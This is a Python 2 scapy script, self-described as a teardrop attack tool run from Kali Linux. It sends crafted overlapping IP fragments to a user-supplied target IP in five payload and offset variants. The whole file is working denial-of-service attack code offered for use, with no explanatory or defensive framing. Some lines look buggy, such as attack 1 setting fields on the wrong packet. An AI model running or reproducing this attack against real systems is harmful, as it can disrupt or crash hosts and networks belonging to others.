#!/usr/bin/env python
import sys
from scapy.all import *

total = len(sys.argv)
if total != 3:
  print "Performs teardrop attack from Kali Linux"
  print " "
  print "Usage: ./tear TARGET-IP ATTACK-CODE"
  print "   Attack Codes:"
  print "   0: small payload (36 bytes), 2 packets, offset=3x8 bytes"
  print "   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes"
  print "   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes"
  print "   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes"
  print "   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes"
  

target=str(sys.argv[1])
attack=sys.argv[2]
headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

print 'Attacking target ' + target + ' with attack ' + attack

if attack == '0':
  print "Using attack 0"
  #size=36
  offset=3
  load1="GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=6
  
  #size=4
  offset=18
  load2="{}\r\n".format(headers[0]).encode("utf-8")

  j=IP()
  j.dst=target
  j.flags="MF"
  j.proto=6
  j.frag=offset
  
  offset = 36
  k=IP()
  k.dst = target
  k.flags=0
  k.proto=6
  k.frag=offset
  load3 ="{}\r\n".format(headers[1]).encode("utf-8")
  send(i/load1)
  send(j/load2)
  send(k/load3)
  

elif attack == '1':
  print "Using attack 1"
  size=1300
  offset=80
  load="GET /index.html HTTP/1.1".encode("utf-8")
  load2 = "\r".encode("utf-8")
  load3="\n".encode("utf-8")
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=6
  
  j=IP()
  j.dst=target
  j.flags="MF"
  j.proto=6
  j.frag=offset
  
  k=IP()
  k.dst=target
  k.flags=0
  j.proto=6
  j.frag=10

  send(i/load)
  send(j/load2)
  send(k/load3)

elif attack == '2':
  print "Using attack 2"
  print "Attacking with attack 2"
  size=1300
  offset=80
  load="A"*size
  
  i=IP()
  i.dst=target
  i.proto=6
  i.flags="MF"
  i.frag=0
  send(i/load)

  print "Attack 2 packet 0"
  
  for x in range(1, 11):
    i.frag=offset
    offset=offset+80
    send(i/load)
    print "Attack 2 packet " + str(x)
  
  i.frag=offset
  i.flags=0
  send(i/load)

elif attack == '3':
  print "Using attack 3"
  size=1336
  offset=3
  load1="\x00"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=6
  
  size=4
  offset=18
  load2="\x00"*size
  
  j=IP()
  j.dst=target
  j.flags=0
  j.proto=6
  j.frag=offset
  
  send(i/load1)
  send(j/load2)

else:         # attack == 4
  print "Using attack 4"
  size=1300
  offset=10
  load="A"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=6
  
  j=IP()
  j.dst=target
  j.flags=0
  j.proto=17
  j.frag=offset
  
  send(i/load)
  send(j/load)

print "Done!"
